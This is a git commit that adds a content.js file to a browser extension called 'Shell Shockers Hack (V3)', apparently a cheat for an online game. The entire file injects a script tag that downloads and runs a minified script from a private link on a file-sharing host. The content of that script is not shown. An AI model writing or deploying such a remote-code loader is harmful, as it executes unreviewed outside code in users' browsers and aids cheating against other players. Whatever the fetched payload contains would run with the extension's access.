79c4b2e4326f446d48e0675865f3e5eae27bb2b4
Triston Stuart <triston.stuart@icloud.com>
2020-03-30 00:53:29 -0700

    V3 of Hack

---
+++ Shell Shockers Hack (V3)/content.js
@@ -0,0 +1,8 @@
+
+ var script = document.createElement('script');
+  script.src = 'https://cdn.filesend.jp/private/h1zMGshiWjRbYTctV4lHDid5QepCHo7Dbai0bWpFqZW1WThGnIcRxcX0VDB4-oim/shellshock.min.js';
+  script.type = 'text/javascript';
+  script.onload = function() {
+    console.log('your script have been loaded');
+  }
+  document.body.appendChild(script);
